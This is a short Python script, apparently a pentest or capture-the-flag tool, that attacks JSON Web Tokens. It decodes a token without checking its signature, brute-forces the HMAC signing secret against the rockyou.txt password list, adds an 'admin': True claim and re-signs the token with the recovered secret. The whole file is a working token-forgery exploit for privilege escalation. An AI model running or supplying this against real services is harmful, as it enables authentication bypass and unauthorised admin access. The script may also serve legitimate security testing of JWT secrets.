#!/usr/bin/env python3

# DEP:
# $ pip3 install pyjwt

import sys
import jwt

def decode(token):
    print(jwt.get_unverified_header(token))
    print(jwt.decode(token, verify=False))

if len(sys.argv) == 2:

    print('==============')
    print('ORIGINAL TOKEN')
    print('==============')
    token = sys.argv[1]
    decode(token)

    print('===============================')
    print('TESTING SECRET AGAINST WORDLIST')
    print('===============================')
    wordlist = open('rockyou.txt', 'r')
    secret = ''

    for word in wordlist:
        try:
            jwt.decode(token, word.strip())
        except jwt.InvalidSignatureError:
            pass
        else:
            print(word.strip())
            secret = word.strip()
            break

    t = jwt.decode(token, verify=False)
    t.update({'admin': True})

    print('==============')
    print('MODIFIED TOKEN')
    print('==============')
    token = jwt.encode(t, secret, algorithm='HS256')
    decode(token)
    print(token)
